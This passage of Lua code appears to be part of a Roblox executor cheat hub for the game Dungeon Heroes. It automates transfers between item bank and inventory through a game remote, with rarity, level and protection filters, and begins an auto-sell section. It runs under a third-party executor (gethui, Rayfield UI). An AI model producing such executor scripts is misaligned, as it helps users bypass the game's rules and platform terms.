        local UID = GetItemUID(Item, FallbackKey)
        if not UID then return nil end

        local ID = nil
        pcall(function() ID = Items:GetItemId(Item) end)
        if not ID then
            if typeof(Item) == "Instance" then
                ID = Item.Name
            elseif type(Item) == "table" then
                ID = Item.id or Item.Id or Item.ItemId or Item.itemId or Item.Name
            end
        end
        if not ID then return nil end

        local Data = nil
        pcall(function() Data = Items:GetItemData(ID) end)
        if type(Data) ~= "table" then return nil end

        -- Rarity: Always prioritize Items:GetRarity(Item) (Fixes Unique Rarity=8 items without Rarity child)
        local Rarity = nil
        local sR, rVal = pcall(function() return Items:GetRarity(Item) end)
        if sR and tonumber(rVal) then
            Rarity = tonumber(rVal)
        elseif typeof(Item) == "Instance" and Item:FindFirstChild("Rarity") then
            Rarity = tonumber(Item.Rarity.Value)
        elseif type(Item) == "table" and tonumber(Item.rarity or Item.Rarity) then
            Rarity = tonumber(Item.rarity or Item.Rarity)
        else
            Rarity = tonumber(Data.Rarity) or 1
        end

        -- Level: Prioritize Items:GetLevel(Item)
        local Level = 1
        local sL, lVal = pcall(function() return Items:GetLevel(Item) end)
        if sL and tonumber(lVal) then
            Level = tonumber(lVal)
        elseif typeof(Item) == "Instance" and Item:FindFirstChild("Level") then
            Level = tonumber(Item.Level.Value) or 1
        elseif type(Item) == "table" and tonumber(Item.level or Item.Level) then
            Level = tonumber(Item.level or Item.Level)
        end

        -- Seasonal Level (For Skills)
        local SeasonalLevel = 1
        if Data.Category == "Skill" then
            local sS, sVal = pcall(function() return Items:GetSeasonalLevel(Item) end)
            if sS and tonumber(sVal) then
                SeasonalLevel = tonumber(sVal)
            end
        end

        return {
            Item = Item,
            UID = UID,
            ID = ID,
            Data = Data,
            Rarity = Rarity,
            Level = Level,
            SeasonalLevel = SeasonalLevel,
        }
    end

    local function IsItemProtected(Item)
        -- 1. Check Favorite & Sealed
        if ProtectFavorites then
            local sFav, isFav = pcall(function()
                return Items:ItemIsFavorited(Item)
            end)
            if sFav and isFav == true then
                return true, "Favorite"
            end

            if typeof(Item) == "Instance" then
                local FavObj = Item:FindFirstChild("Favorite")
                if FavObj and FavObj.Value == true then
                    return true, "Favorite"
                end
                if Item:FindFirstChild("Sealed") or Item:GetAttribute("Sealed") == true then
                    return true, "Sealed"
                end
            elseif type(Item) == "table" then
                if Item.favorite == true or Item.Favorite == true or Item.sealed == true or Item.Sealed == true then
                    return true, "Favorite"
                end
            end
        end

        -- 2. Check Saved Gear Presets (GearPreset1, GearPreset2, GearPreset3 seen in Dump)
        if ProtectGearPresets then
            if typeof(Item) == "Instance" then
                for _, Child in ipairs(Item:GetChildren()) do
                    if string.find(Child.Name, "^GearPreset") then
                        return true, "Preset"
                    end
                end
            elseif type(Item) == "table" then
                if Item.GearPreset1 or Item.GearPreset2 or Item.GearPreset3 or Item.presets then
                    return true, "Preset"
                end
            end
        end

        return false, nil
    end

    -- ==========================================
    -- FILTER MATCHING LOGIC
    -- ==========================================

    local function IsGearOrSkillCategory(Category)
        return Category == "Weapon"
            or Category == "Armor"
            or Category == "Necklace"
            or Category == "Skill"
    end

    local function MatchesCategoryFilter(Data)
        if IsExcludedCategory(Data) then
            return false
        end

        local Cat = Data.Category
        local Kind = SelectedFilter.kind

        if Kind == "all_bankable" then
            return true
        elseif Kind == "gear_all" then
            return Cat == "Weapon" or Cat == "Armor" or Cat == "Necklace"
        elseif Kind == "gear_and_skill" then
            return IsGearOrSkillCategory(Cat)
        elseif Kind == "category" then
            return Cat == SelectedFilter.category
                or Data.SortCategory == SelectedFilter.category
        end

        return false
    end

    local function PassesRarityAndLevel(Details)
        -- 1. Rarity Check
        if not AllRaritiesEnabled then
            if RarityConfig[Details.Rarity] ~= true then
                return false
            end
        end

        -- 2. Level Range Check (Applies to Weapon, Armor, Necklace, Skill)
        if LevelFilterEnabled and IsGearOrSkillCategory(Details.Data.Category) then
            if Details.Level < MinLevelFilter or Details.Level > MaxLevelFilter then
                return false
            end
        end

        return true
    end

    -- ==========================================
    -- STORAGE CONTAINERS (INVENTORY & ITEM BANK)
    -- ==========================================

    local function GetRawContainerItems(Direction)
        local RawList = {}
        local SeenUIDs = {}
        local Profile = ProfileSystem:GetProfile(Player)

        local function AddRawItem(Item, Key)
            if not Item then return end
            -- Ignore nested folders like Profile.Equipped.Right
            if typeof(Item) == "Instance" and Item:IsA("Folder") then
                return
            end
            local UID = GetItemUID(Item, Key)
            if UID and not SeenUIDs[UID] then
                SeenUIDs[UID] = true
                table.insert(RawList, {Item = Item, Key = Key, UID = UID})
            end
        end

        if Direction == "Inventory -> Bank" then
            -- 1. Profile.Inventory (Weapons, Armor, Skills, Necklaces, Gems, Chests)
            local InvFolder = (Profile and Profile:FindFirstChild("Inventory"))
                or Items:GetPlayerItemFolder(Player, "Inventory")
            if InvFolder then
                for _, Child in ipairs(InvFolder:GetChildren()) do
                    AddRawItem(Child, nil)
                end
            end

            -- 2. Profile.Pets (Pets & Pet Tokens)
            local PetsFolder = (Profile and Profile:FindFirstChild("Pets"))
                or Items:GetPlayerItemFolder(Player, "Pets")
            if PetsFolder then
                for _, Child in ipairs(PetsFolder:GetChildren()) do
                    AddRawItem(Child, nil)
                end
            end

            -- 3. Also check Table Records for Inventory/Pets if any exist
            for _, ContainerName in ipairs({"Inventory", "Pets"}) do
                local sT, Tbl = pcall(function()
                    return Items:GetTableItems(Player, ContainerName)
                end)
                if sT and type(Tbl) == "table" then
                    for k, v in pairs(Tbl) do
                        AddRawItem(v, k)
                    end
                end
            end
        else
            -- BANK -> INVENTORY (Checks ALL Bank storage mechanisms)
            -- 1. Items:GetTableItems(Player, "ItemBank")
            local s1, BankTable = pcall(function()
                return Items:GetTableItems(Player, "ItemBank")
            end)
            if s1 and type(BankTable) == "table" then
                for k, v in pairs(BankTable) do
                    AddRawItem(v, k)
                end
            end

            -- 2. Items:GetRecordContainer(Player, "ItemBank")
            local s2, RecContainer = pcall(function()
                return Items:GetRecordContainer(Player, "ItemBank")
            end)
            if s2 and type(RecContainer) == "table" then
                local SubTbl = RecContainer.Items or RecContainer.Records or RecContainer
                if type(SubTbl) == "table" then
                    for k, v in pairs(SubTbl) do
                        if type(v) == "table" or typeof(v) == "Instance" then
                            AddRawItem(v, k)
                        end
                    end
                end
            end

            -- 3. Items:GetPlayerItemFolder(Player, "ItemBank") & Profile.ItemBank
            local BankFolder = nil
            pcall(function()
                BankFolder = Items:GetPlayerItemFolder(Player, "ItemBank")
            end)
            if not BankFolder and Profile then
                BankFolder = Profile:FindFirstChild("ItemBank")
            end
            if BankFolder and typeof(BankFolder) == "Instance" then
                for _, Child in ipairs(BankFolder:GetChildren()) do
                    AddRawItem(Child, nil)
                end
            end
        end

        return RawList
    end

    local function GetInventoryUsedCount()
        local Profile = ProfileSystem:GetProfile(Player)
        local Inv = Profile and Profile:FindFirstChild("Inventory")
        return Inv and #Inv:GetChildren() or 0
    end

    local function GetTotalBankCount()
        local s, cnt = pcall(function()
            return Items:GetItemBankStorageCount(Player)
        end)
        if s and tonumber(cnt) and tonumber(cnt) > 0 then
            return tonumber(cnt)
        end
        return #GetRawContainerItems("Bank -> Inventory")
    end

    -- ==========================================
    -- COLLECT & BUILD FINAL TRANSFER LIST
    -- ==========================================

    local function ScanCandidates(IgnoreUIDLock)
        local Now = os.clock()
        for UID, TimeStamp in pairs(RecentlyTransferred) do
            if Now - TimeStamp >= UIDLockDuration then
                RecentlyTransferred[UID] = nil
            end
        end

        local RawItems = GetRawContainerItems(TransferDirection)
        local MatchedEntries = {}
        local ProtectedSkippedCount = 0

        for _, Raw in ipairs(RawItems) do
            local IsLocked = (not IgnoreUIDLock) and RecentlyTransferred[Raw.UID]
            if not IsLocked then
                local Details = GetItemDetails(Raw.Item, Raw.Key)
                if Details and MatchesCategoryFilter(Details.Data) and PassesRarityAndLevel(Details) then
                    local Protected, Reason = IsItemProtected(Raw.Item)
                    Details.Protected = Protected
                    Details.ProtectReason = Reason

                    if Protected then
                        ProtectedSkippedCount = ProtectedSkippedCount + 1
                    end
                    table.insert(MatchedEntries, Details)
                end
            end
        end

        return MatchedEntries, ProtectedSkippedCount
    end

    local function SortEntries(Entries)
        table.sort(Entries, function(a, b)
            if SortPriority == "Highest Level First" then
                if a.Level ~= b.Level then return a.Level > b.Level end
                return a.Rarity > b.Rarity
            elseif SortPriority == "Lowest Level First" then
                if a.Level ~= b.Level then return a.Level < b.Level end
                return a.Rarity < b.Rarity
            elseif SortPriority == "Highest Rarity First" then
                if a.Rarity ~= b.Rarity then return a.Rarity > b.Rarity end
                return a.Level > b.Level
            elseif SortPriority == "Lowest Rarity First" then
                if a.Rarity ~= b.Rarity then return a.Rarity < b.Rarity end
                return a.Level < b.Level
            end
            return tostring(a.UID) < tostring(b.UID)
        end)
    end

    local function BuildTransferList(MatchedEntries)
        local FinalList = {}

        if TransferMode == "All Matching" then
            for _, Entry in ipairs(MatchedEntries) do
                if not Entry.Protected then
                    table.insert(FinalList, Entry)
                end
            end
            SortEntries(FinalList)
            return FinalList
        end

        -- Duplicates Only (Keep 1 Highest Level copy, transfer extras)
        local Groups = {}
        for _, Entry in ipairs(MatchedEntries) do
            local Key = tostring(Entry.ID) .. "|" .. tostring(Entry.Rarity)
            if Entry.Data.Category == "Skill" then
                Key = Key .. "|" .. tostring(Entry.SeasonalLevel)
            end
            Groups[Key] = Groups[Key] or {}
            table.insert(Groups[Key], Entry)
        end

        for _, Group in pairs(Groups) do
            local ProtectedList = {}
            local UnprotectedList = {}

            for _, Entry in ipairs(Group) do
                if Entry.Protected then
                    table.insert(ProtectedList, Entry)
                else
                    table.insert(UnprotectedList, Entry)
                end
            end

            local BestProtectedLevel = -math.huge
            for _, Entry in ipairs(ProtectedList) do
                BestProtectedLevel = math.max(BestProtectedLevel, Entry.Level)
            end

            table.sort(UnprotectedList, function(a, b)
                return a.Level > b.Level
            end)

            local KeptOne = false
            for _, Entry in ipairs(UnprotectedList) do
                if not KeptOne and (#ProtectedList == 0 or Entry.Level > BestProtectedLevel) then
                    KeptOne = true
                else
                    table.insert(FinalList, Entry)
                end
            end
        end

        SortEntries(FinalList)
        return FinalList
    end

    -- ==========================================
    -- TRANSFER EXECUTION ENGINE
    -- ==========================================

    local IsTransferringBatch = false
    local MasterToggleRef = nil

    local function StopAutoTransferWithNotify(Title, SubText, Color)
        AutoTransferEnabled = false
        if MasterToggleRef and MasterToggleRef.Set then
            pcall(function() MasterToggleRef:Set(false) end)
        end
        ShowTopNotification(Title, SubText, Color or Color3.fromRGB(255, 170, 0), 3.5)
    end

    local function ExecuteBankTransfer(IsManualRun)
        if IsTransferringBatch then return end
        IsTransferringBatch = true

        local Success, Err = pcall(function()
            -- Space Guard Check before pulling Bank -> Inventory
            if TransferDirection == "Bank -> Inventory" and EnableSpaceGuard then
                local UsedInv = GetInventoryUsedCount()
                if UsedInv >= MaxInventoryCap then
                    StopAutoTransferWithNotify(
                        "Inventory Space Guard!",
                        string.format("Bag limit reached (%d/%d items). Stopped safely.", UsedInv, MaxInventoryCap),
                        Color3.fromRGB(255, 90, 90)
                    )
                    return
                end
            end

            local MatchedEntries, ProtectedSkipped = ScanCandidates(false)
            local FinalList = BuildTransferList(MatchedEntries)

            if #FinalList == 0 then
                if IsManualRun then
                    if ProtectedSkipped > 0 then
                        ShowTopNotification(
                            "0 Ready (" .. tostring(ProtectedSkipped) .. " Protected!)",
                            "Matching items Fav/Preset hain! Protection toggle check karo.",
                            Color3.fromRGB(255, 180, 40),
                            3.5
                        )
                    else
                        ShowTopNotification(
                            "No Matching Items Found!",
                            "Rarity toggle ya Category/Level filter check karo.",
                            Color3.fromRGB(255, 100, 100),
                            3
                        )
                    end
                end
                return
            end

            local TransferredThisRun = 0

            for _, Entry in ipairs(FinalList) do
                if not AutoTransferEnabled and not IsManualRun then
                    break
                end

                -- 1. Check Max Batch Quantity Limit
                if MaxTransferCount > 0 and TransferCounter >= MaxTransferCount then
                    if AutoStopOnLimit or IsManualRun then
                        StopAutoTransferWithNotify(
                            "Batch Transfer Complete!",
                            string.format("Transferred %d/%d items (%s).", TransferCounter, MaxTransferCount, SelectedCategory),
                            Color3.fromRGB(0, 230, 140)
                        )
                    end
                    break
                end

                -- 2. Live Inventory Capacity Check during Bank -> Inventory
                if TransferDirection == "Bank -> Inventory" and EnableSpaceGuard then
                    local UsedInv = GetInventoryUsedCount()
                    if UsedInv >= MaxInventoryCap then
                        StopAutoTransferWithNotify(
                            "Inventory Space Guard!",
                            string.format("Stopped at %d/%d Inventory items.", UsedInv, MaxInventoryCap),
                            Color3.fromRGB(255, 120, 60)
                        )
                        break
                    end
                end

                RecentlyTransferred[Entry.UID] = os.clock()
                TransferCounter = TransferCounter + 1
                TransferredThisRun = TransferredThisRun + 1

                -- Fire exact Hex ItemUid (e.g. "3301f9")
                ItemBankRemote:FireServer(Entry.UID)
                task.wait(SingleTransferDelay)
            end

            if IsManualRun and TransferredThisRun > 0 then
                ShowTopNotification(
                    "Transferred " .. tostring(TransferredThisRun) .. " Item(s)!",
                    string.format("%s | Category: %s", TransferDirection, SelectedCategory),
                    Color3.fromRGB(0, 230, 140),
                    3
                )
            end
        end)

        if not Success then
            warn("[Item Bank Error]:", Err)
            ShowTopNotification("Bank Script Error!", tostring(Err), Color3.fromRGB(255, 70, 70), 4)
        end

        IsTransferringBatch = false
    end

    -- ==========================================
    -- RAYFIELD UI CONTROLS
    -- ==========================================

    MasterToggleRef = UtilityTab:CreateToggle({
        Name = "Auto Bank Transfer (Master Switch)",
        CurrentValue = false,
        Flag = "DH_BankMasterToggle",
        Callback = function(Value)
            AutoTransferEnabled = Value
            if Value then
                TransferCounter = 0
                ShowTopNotification(
                    "Auto Bank Transfer: ON",
                    string.format("%s | %s", TransferDirection, SelectedCategory),
                    Color3.fromRGB(0, 220, 130),
                    2.5
                )
            else
                ShowTopNotification(
                    "Auto Bank Transfer: OFF",
                    "Transfer loop paused.",
                    Color3.fromRGB(255, 120, 80),
                    2
                )
            end
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Transfer Direction",
        Options = {
            "Inventory -> Bank",
            "Bank -> Inventory"
        },
        CurrentOption = "Inventory -> Bank",
        MultipleOptions = false,
        Flag = "DH_BankDirection",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if Option then
                TransferDirection = Option
                TransferCounter = 0
                table.clear(RecentlyTransferred)
                ShowTopNotification("Direction Changed", TransferDirection, Color3.fromRGB(80, 180, 255), 2.5)
            end
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Select Category",
        Options = CategoryOptions,
        CurrentOption = "Gear (Weapon + Armor + Necklace)",
        MultipleOptions = false,
        Flag = "DH_BankCategory",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if Option and FilterMap[Option] then
                SelectedCategory = Option
                SelectedFilter = FilterMap[Option]
                TransferCounter = 0
                ShowTopNotification("Category Selected", SelectedCategory, Color3.fromRGB(80, 180, 255), 2.5)
            end
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Transfer Mode",
        Options = {
            "All Matching",
            "Duplicates Only (Keep 1 Best)"
        },
        CurrentOption = "All Matching",
        MultipleOptions = false,
        Flag = "DH_BankMode",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if Option then
                TransferMode = Option
            end
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Transfer Priority Order",
        Options = {
            "Highest Level First",
            "Lowest Level First",
            "Highest Rarity First",
            "Lowest Rarity First"
        },
        CurrentOption = "Highest Level First",
        MultipleOptions = false,
        Flag = "DH_BankPriority",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if Option then
                SortPriority = Option
            end
        end
    })

    UtilityTab:CreateToggle({
        Name = "Protect Favorited & Sealed Items",
        CurrentValue = true,
        Flag = "DH_BankProtectFav",
        Callback = function(Value)
            ProtectFavorites = Value
        end
    })

    UtilityTab:CreateToggle({
        Name = "Protect Gear Preset Items (Preset 1/2/3)",
        CurrentValue = true,
        Flag = "DH_BankProtectPresets",
        Callback = function(Value)
            ProtectGearPresets = Value
        end
    })

    -- ==========================================
    -- QUANTITY & INVENTORY SPACE SAFETY
    -- ==========================================

    UtilityTab:CreateSection("Batch Limit & Space Protection")

    UtilityTab:CreateSlider({
        Name = "Max Items To Transfer (0 = Unlimited)",
        Range = {0, 200},
        Increment = 1,
        Suffix = " Items",
        CurrentValue = 10,
        Flag = "DH_BankMaxSlider",
        Callback = function(Value)
            MaxTransferCount = tonumber(Value) or 0
            TransferCounter = 0
        end
    })

    UtilityTab:CreateInput({
        Name = "Type Exact Quantity (0 = Unlimited)",
        PlaceholderText = "e.g. 15",
        RemoveTextAfterFocusLost = false,
        Callback = function(Text)
            local Num = tonumber(Text)
            if Num and Num >= 0 then
                MaxTransferCount = math.floor(Num)
                TransferCounter = 0
                ShowTopNotification(
                    "Batch Quantity Set",
                    "Max Items: " .. (MaxTransferCount == 0 and "Unlimited" or tostring(MaxTransferCount)),
                    Color3.fromRGB(0, 220, 140),
                    2.5
                )
            end
        end
    })

    UtilityTab:CreateToggle({
        Name = "Auto-Stop When Batch Quantity Reached",
        CurrentValue = true,
        Flag = "DH_BankAutoStopBatch",
        Callback = function(Value)
            AutoStopOnLimit = Value
        end
    })

    UtilityTab:CreateToggle({
        Name = "Enable Inventory Space Guard (Bank -> Inv)",
        CurrentValue = true,
        Flag = "DH_BankSpaceGuard",
        Callback = function(Value)
            EnableSpaceGuard = Value
        end
    })

    UtilityTab:CreateSlider({
        Name = "Stop When Inventory Reaches X Items",
        Range = {30, 300},
        Increment = 5,
        Suffix = " Items",
        CurrentValue = 180,
        Flag = "DH_BankInvCap",
        Callback = function(Value)
            MaxInventoryCap = tonumber(Value) or 180
        end
    })

    -- ==========================================
    -- GEAR & SKILL LEVEL FILTER (1 TO 500)
    -- ==========================================

    UtilityTab:CreateSection("Gear & Skill Level Filter (Lv 1 - 500)")

    UtilityTab:CreateToggle({
        Name = "Enable Level Range Filter (Gear & Skills)",
        CurrentValue = false,
        Flag = "DH_BankLevelToggle",
        Callback = function(Value)
            LevelFilterEnabled = Value
        end
    })

    UtilityTab:CreateInput({
        Name = "Quick Level Range (Format: Min-Max)",
        PlaceholderText = "e.g. 200-240",
        RemoveTextAfterFocusLost = false,
        Callback = function(Text)
            local MinStr, MaxStr = string.match(tostring(Text), "(%d+)%s*-%s*(%d+)")
            local MinVal, MaxVal = tonumber(MinStr), tonumber(MaxStr)
            if MinVal and MaxVal then
                MinLevelFilter = math.min(MinVal, MaxVal)
                MaxLevelFilter = math.max(MinVal, MaxVal)
                ShowTopNotification(
                    "Level Filter Updated",
                    string.format("Range: Level %d to %d", MinLevelFilter, MaxLevelFilter),
                    Color3.fromRGB(0, 220, 140),
                    3
                )
            end
        end
    })

    UtilityTab:CreateSlider({
        Name = "Minimum Level",
        Range = {1, 500},
        Increment = 1,
        Suffix = " Lv",
        CurrentValue = 1,
        Flag = "DH_BankMinLevel",
        Callback = function(Value)
            MinLevelFilter = tonumber(Value) or 1
            if MinLevelFilter > MaxLevelFilter then
                MaxLevelFilter = MinLevelFilter
            end
        end
    })

    UtilityTab:CreateSlider({
        Name = "Maximum Level",
        Range = {1, 500},
        Increment = 1,
        Suffix = " Lv",
        CurrentValue = 500,
        Flag = "DH_BankMaxLevel",
        Callback = function(Value)
            MaxLevelFilter = tonumber(Value) or 500
            if MaxLevelFilter < MinLevelFilter then
                MinLevelFilter = MaxLevelFilter
            end
        end
    })

    -- ==========================================
    -- RARITY FILTERS (1 TO 9)
    -- ==========================================

    UtilityTab:CreateSection("Rarity Filters (1 to 9)")

    UtilityTab:CreateToggle({
        Name = "Allow All Rarities (Ignore Toggles Below)",
        CurrentValue = false,
        Flag = "DH_BankRarityAll",
        Callback = function(Value)
            AllRaritiesEnabled = Value
        end
    })

    local Rarities = {
        {Name = "Common (ID 1)", ID = 1, Key = "Common"},
        {Name = "Uncommon (ID 2)", ID = 2, Key = "Uncommon"},
        {Name = "Rare (ID 3)", ID = 3, Key = "Rare"},
        {Name = "Epic (ID 4)", ID = 4, Key = "Epic"},
        {Name = "Legendary (ID 5)", ID = 5, Key = "Legendary"},
        {Name = "Mythic (ID 6)", ID = 6, Key = "Mythic"},
        {Name = "Primordial (ID 7)", ID = 7, Key = "Primordial"},
        {Name = "Unique (ID 8)", ID = 8, Key = "Unique"},
        {Name = "Nightmare (ID 9)", ID = 9, Key = "Nightmare"},
    }

    for _, Rarity in ipairs(Rarities) do
        UtilityTab:CreateToggle({
            Name = "Transfer " .. Rarity.Name,
            CurrentValue = false,
            Flag = "DH_BankRarity_" .. Rarity.Key,
            Callback = function(Value)
                RarityConfig[Rarity.ID] = Value
            end
        })
    end

    -- ==========================================
    -- SCANNER & MANUAL ONE-SHOT BUTTONS
    -- ==========================================

    UtilityTab:CreateSection("Scanner & Instant Transfer")

    UtilityTab:CreateButton({
        Name = "Scan Matching Items (Top UI Notification)",
        Callback = function()
            local InvCount = GetInventoryUsedCount()
            local BankCount = GetTotalBankCount()
            local MatchedEntries, ProtectedSkipped = ScanCandidates(true)
            local ReadyList = BuildTransferList(MatchedEntries)

            ShowTopNotification(
                string.format("Ready: %d | Protected: %d (Inv:%d Bank:%d)", #ReadyList, ProtectedSkipped, InvCount, BankCount),
                string.format("%s | %s", TransferDirection, SelectedCategory),
                (#ReadyList > 0) and Color3.fromRGB(0, 230, 140) or Color3.fromRGB(255, 180, 40),
                4
            )
        end
    })

    UtilityTab:CreateButton({
        Name = "Transfer Batch Once Now",
        Callback = function()
            task.spawn(function()
                TransferCounter = 0
                ExecuteBankTransfer(true)
            end)
        end
    })

    -- ==========================================
    -- BACKGROUND LOOP
    -- ==========================================

    task.spawn(function()
        while true do
            task.wait(ScanDelay)
            if AutoTransferEnabled and not IsTransferringBatch then
                ExecuteBankTransfer(false)
            end
        end
    end)
end

UtilityTab:CreateSection("Ultimate Safe Auto Sell V4 (Inv + Bank)")
do
    --====================================================
    -- DUNGEON HEROES | ULTIMATE ZERO-RISK AUTO SELL V4
    -- New in V4:
    -- 1. Sell Source Dropdown: Inventory Only | Bank Only (Auto-Bridge) | Both
    -- 2. Double-Stage Bank Safety: Pre-Pull Scan + Post-Pull Live Instance Check
    --    (Auto-returns item to Bank & blacklists UID if God-Roll/Gem detected!)
    -- 3. UNIQUE RARITY (ID 8) Permanently Blocked & Removed from UI
    -- 4. Cosmetics Force Duplicate-Only Mode + Exact Dye Color Grouping
    -- 5. Upgraded Sleek Top UI Notification with Progress Timer Bar
    --====================================================

    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local TweenService = game:GetService("TweenService")
    local CoreGui = game:GetService("CoreGui")

    local Player = Players.LocalPlayer

    local Items = require(RS.Systems.Items)
    local ItemSelling = require(RS.Systems.ItemSelling)
    local ProfileSystem = require(RS.Systems.Profile)
    local ItemBankRemote = RS:WaitForChild("Remotes"):WaitForChild("ItemBankTransfer")

    -- ==========================================
    -- PRO TOP UI NOTIFICATION (SLEEK + TIMER BAR)
    -- ==========================================
    local function ShowTopNotification(TitleText, SubText, AccentColor, Duration)
        task.spawn(function()
            pcall(function()
                local ShowTime = Duration or 3.2
                local ThemeColor = AccentColor or Color3.fromRGB(0, 225, 140)

                local ParentGui = (gethui and gethui())
                    or CoreGui
                    or Player:WaitForChild("PlayerGui")

                local OldGui = ParentGui:FindFirstChild("DH_ProAutoSellNotify")
                if OldGui then OldGui:Destroy() end

                local ScreenGui = Instance.new("ScreenGui")
                ScreenGui.Name = "DH_ProAutoSellNotify"
                ScreenGui.IgnoreGuiInset = true
                ScreenGui.DisplayOrder = 999999
                ScreenGui.Parent = ParentGui

                local MainFrame = Instance.new("Frame")
                MainFrame.Size = UDim2.new(0, 410, 0, 66)
                MainFrame.Position = UDim2.new(0.5, -205, 0, -85)
                MainFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 24)
                MainFrame.BorderSizePixel = 0
                MainFrame.ClipsDescendants = true
                MainFrame.Parent = ScreenGui

                local MainCorner = Instance.new("UICorner")
                MainCorner.CornerRadius = UDim.new(0, 12)
                MainCorner.Parent = MainFrame

                local MainStroke = Instance.new("UIStroke")
                MainStroke.Color = ThemeColor
                MainStroke.Thickness = 1.6
                MainStroke.Transparency = 0.15
                MainStroke.Parent = MainFrame

                local BgGradient = Instance.new("UIGradient")
                BgGradient.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(24, 28, 38)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(14, 16, 22))
                })
                BgGradient.Rotation = 90
                BgGradient.Parent = MainFrame

                local SideBar = Instance.new("Frame")
                SideBar.Size = UDim2.new(0, 5, 1, -16)
                SideBar.Position = UDim2.new(0, 8, 0, 8)
                SideBar.BackgroundColor3 = ThemeColor
                SideBar.BorderSizePixel = 0
                SideBar.Parent = MainFrame

                local SideCorner = Instance.new("UICorner")
                SideCorner.CornerRadius = UDim.new(1, 0)
                SideCorner.Parent = SideBar

                local Title = Instance.new("TextLabel")
                Title.Size = UDim2.new(1, -34, 0, 22)
                Title.Position = UDim2.new(0, 22, 0, 8)
                Title.BackgroundTransparency = 1
                Title.Font = Enum.Font.GothamBold
                Title.TextSize = 14
                Title.TextColor3 = ThemeColor
                Title.TextXAlignment = Enum.TextXAlignment.Left
                Title.TextTruncate = Enum.TextTruncate.AtEnd
                Title.Text = tostring(TitleText)
                Title.Parent = MainFrame

                local Sub = Instance.new("TextLabel")
                Sub.Size = UDim2.new(1, -34, 0, 20)
                Sub.Position = UDim2.new(0, 22, 0, 31)
                Sub.BackgroundTransparency = 1
                Sub.Font = Enum.Font.GothamMedium
                Sub.TextSize = 12
                Sub.TextColor3 = Color3.fromRGB(220, 225, 235)
                Sub.TextXAlignment = Enum.TextXAlignment.Left
                Sub.TextTruncate = Enum.TextTruncate.AtEnd
                Sub.Text = tostring(SubText)
                Sub.Parent = MainFrame

                local BarBg = Instance.new("Frame")
                BarBg.Size = UDim2.new(1, 0, 0, 3)
                BarBg.Position = UDim2.new(0, 0, 1, -3)
                BarBg.BackgroundColor3 = Color3.fromRGB(35, 40, 52)
                BarBg.BorderSizePixel = 0
                BarBg.Parent = MainFrame

                local BarFill = Instance.new("Frame")
                BarFill.Size = UDim2.new(1, 0, 1, 0)
                BarFill.BackgroundColor3 = ThemeColor
                BarFill.BorderSizePixel = 0
                BarFill.Parent = BarBg

                TweenService:Create(
                    MainFrame,
                    TweenInfo.new(0.32, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                    {Position = UDim2.new(0.5, -205, 0, 16)}
                ):Play()

                TweenService:Create(
                    BarFill,
                    TweenInfo.new(ShowTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
                    {Size = UDim2.new(0, 0, 1, 0)}
                ):Play()

                task.wait(ShowTime)

                if MainFrame and MainFrame.Parent then
                    local OutTween = TweenService:Create(
                        MainFrame,
                        TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                        {Position = UDim2.new(0.5, -205, 0, -85)}
                    )
                    OutTween:Play()
                    OutTween.Completed:Wait()
                    if ScreenGui then ScreenGui:Destroy() end
                end
            end)
        end)
    end

    -- ==========================================
    -- SETTINGS & SAFETY STATE
    -- ==========================================
    local AutoSellEnabled = false
    local SellSource = "From Inventory Only" -- "From Inventory Only" | "From Bank Only (Auto-Bridge)" | "From Both (Inventory + Bank)"
    local DuplicateSellEnabled = false

    -- Bank Bridge Controls
    local BankPullBatchSize = 5          -- Pulls max 5 items at a time so Inventory never overflows
    local AutoReturnIfProtected = true   -- Sends item back to Bank if live inspection finds God-Roll/Gem
    local SafeBagLimitForBridge = 190    -- Pauses Bank pull if Inventory already has >= 190 items
    local BankProtectedUIDBlacklist = {} -- Permanent memory of Bank UIDs that triggered Post-Pull Shield
    local RecentlyPulledUIDs = {}

    -- Smart Protection Toggles (All ON by default)
    local ProtectSocketedGems = true     -- Never sell Gear with a Gem attached
    local ProtectGearPresets = true      -- Never sell Preset 1/2/3 items
    local ProtectGodRolls = true         -- Never sell Gear with 4x/5x identical stats
    local MinMatchingStatsToProtect = 4  -- 4 = 4x or 5x matching stats safe

    -- Optional Max Sell Level Cap
    local UseMaxSellLevelCap = false
    local MaxSellLevel = 215

    -- Timings
    local ScanDelay = 0.25
    local SellCooldown = 1.0
    local LastSellTime = 0
    local IsRunningCycle = false

    local SelectedCategory = "Gear (Weapons + Armor Only)"
    local SelectedFilter = {kind = "gear_weapon_armor", isCosmetic = false}

    -- Rarity Configuration (UNIQUE ID 8 IS PERMANENTLY EXCLUDED & BLOCKED!)
    local RarityConfig = {
        [1] = false, -- Common
        [2] = false, -- Uncommon
        [3] = false, -- Rare
        [4] = false, -- Epic
        [5] = false, -- Legendary
        [6] = false, -- Mythic
        [7] = false, -- Primordial
        -- [8] Unique is PERMANENTLY BLOCKED
        [9] = false, -- Nightmare
    }

    -- ==========================================
    -- DESCRIPTIVE CATEGORY DROPDOWN SETUP
    -- ==========================================
    local function IsTitleData(Data)
        return type(Data) == "table"
            and Data.Category == "Cosmetic"
            and Data.Type == "Title"
    end

    local CategoryOptions = {
        "Gear (Weapons + Armor Only)",
        "Weapon Only",
        "Armor Only",
        "Necklace Only",
        "Skill Only",
        "Pet Only",
        "Pet Token Only",
        "Refined Gem Only",
        "Cosmetic: Title (Dupes Only)",
        "Cosmetic: Weapon Aura (Dupes Only)",
        "Cosmetic: Body Aura (Dupes Only)",
        "Cosmetic: Weapon Skin (Dupes Only)",
        "Cosmetic: Shirt (Dupes Only)",
        "Cosmetic: Pants (Dupes Only)",
        "Cosmetic: All Types (Dupes Only)",
    }

    local FilterMap = {
